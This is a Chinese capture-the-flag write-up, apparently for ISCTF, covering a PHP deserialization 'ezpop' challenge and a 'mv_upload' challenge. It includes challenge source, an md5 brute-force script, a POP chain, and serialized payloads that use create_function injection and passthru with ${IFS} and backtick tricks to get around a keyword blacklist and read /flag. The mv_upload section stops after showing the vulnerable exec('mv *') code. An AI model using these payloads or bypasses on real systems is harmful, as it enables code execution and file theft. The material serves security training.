<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&quot;create_function&quot;</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;;&#125;var_dump(`/usr/b??/?l /?lag`);/*&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="ezpop（复现）"><a href="#ezpop（复现）" class="headerlink" title="ezpop（复现）"></a>ezpop（复现）</h1><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="#PHP反序列化"></a>#PHP反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个双重md5的弱比较，用md5碰撞脚本去碰一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 运⾏: python py文件 需要碰撞的md5值 开始匹配的位置</span></span><br><span class="line"><span class="comment"># python md5.py &quot;666&quot; 0</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start+str_len] == substr:</span><br><span class="line">            <span class="comment"># print rnds</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line">            <span class="comment">#碰撞双md5</span></span><br><span class="line">            md5 = hashlib.md5(value)</span><br><span class="line">            <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">                <span class="built_in">print</span> rnds+ <span class="string">&quot;=&gt;&quot;</span> + value+<span class="string">&quot;=&gt;&quot;</span>+ md5.hexdigest()  + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ISCTF2025/image-20251223153532191.png" alt="image-20251223153532191"></p>
<p>先把链子写出来吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">begin::<span class="title function_ invoke__">__destruct</span>()-&gt;begin::<span class="title function_ invoke__">__toString</span>()-&gt;flaag::<span class="title function_ invoke__">__invoke</span>()-&gt;eenndd::<span class="title function_ invoke__">__get</span>()</span><br></pre></td></tr></table></figure>

<h2 id="最终的poc"><a href="#最终的poc" class="headerlink" title="最终的poc"></a>最终的poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 -&gt; var2 = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 -&gt; var2 -&gt; var11 = <span class="string">&quot;rSYwGEnSLmJWWqkEARJp&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 -&gt; var2 -&gt; var10 = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 -&gt; var2 -&gt; var10 -&gt; command = <span class="string">&quot;passthru(&#x27;ta``c\$&#123;IFS&#125;/fl*&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="mv-upload"><a href="#mv-upload" class="headerlink" title="mv_upload"></a>mv_upload</h1><h2 id="mv参数注入-文件上传"><a href="#mv参数注入-文件上传" class="headerlink" title="#mv参数注入+文件上传"></a>#mv参数注入+文件上传</h2><p>扫目录扫到一个<code>/index.php~</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="string">&#x27;/tmp/upload/&#x27;</span>; <span class="comment">// 临时目录</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;/var/www/html/upload/&#x27;</span>; <span class="comment">// 存储目录</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$blacklist</span> = [</span><br><span class="line">    <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phps&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;jspa&#x27;</span>, <span class="string">&#x27;jspx&#x27;</span>, <span class="string">&#x27;jsw&#x27;</span>, <span class="string">&#x27;jsv&#x27;</span>, <span class="string">&#x27;jspf&#x27;</span>, <span class="string">&#x27;jtml&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;ascx&#x27;</span>, <span class="string">&#x27;ashx&#x27;</span>, <span class="string">&#x27;asmx&#x27;</span>, <span class="string">&#x27;cer&#x27;</span>, <span class="string">&#x27;aSp&#x27;</span>, <span class="string">&#x27;aSpx&#x27;</span>, <span class="string">&#x27;cEr&#x27;</span>, <span class="string">&#x27;pHp&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;shtm&#x27;</span>, <span class="string">&#x27;stm&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;exe&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>, <span class="string">&#x27;scgi&#x27;</span>,<span class="string">&#x27;htaccess&#x27;</span>, <span class="string">&#x27;htpasswd&#x27;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>,  <span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$filesInTmp</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目标目录</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$targetDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$targetDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上传临时目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploadedFiles</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;error&#x27;</span>][<span class="variable">$index</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 上传失败。&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpName</span> = <span class="variable">$uploadedFiles</span>[<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$index</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件名无效，跳过。&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fileParts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="keyword">isset</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="title function_ invoke__">strtolower</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$extension</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$blacklist</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 因类型不安全（.<span class="subst">&#123;$extension&#125;</span>）被拒绝。&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpName</span>, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 已上传至 <span class="subst">$uploadDir</span><span class="subst">$filename</span> 。&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 移动失败。&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取临时目录中的所有文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$uploadDir</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="variable">$filesInTmp</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理确认上传完毕（移动文件）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;confirm_move&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filesInTmp</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> .= <span class="string">&quot;没有可移动的文件。&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = [];</span><br><span class="line">        <span class="variable">$returnCode</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$returnCode</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$filesInTmp</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                <span class="variable">$message</span> .= <span class="string">&quot;已移动文件: <span class="subst">&#123;$file&#125;</span> 至<span class="subst">$targetDir</span><span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;移动文件失败: &quot;</span> .<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$output</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>黑名单里面差不多都把恶意文件后缀名都给过滤了，直接传马子的话是不太现实了</p>
<p>关注到最后的移动文件部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理确认上传完毕（移动文件）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;confirm_move&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filesInTmp</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> .= <span class="string">&quot;没有可移动的文件。&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = [];</span><br><span class="line">        <span class="variable">$returnCode</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$returnCode</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$filesInTmp</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                <span class="variable">$message</span> .= <span class="string">&quot;已移动文件: <span class="subst">&#123;$file&#125;</span> 至<span class="subst">$targetDir</span><span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;移动文件失败: &quot;</span> .<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$output</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

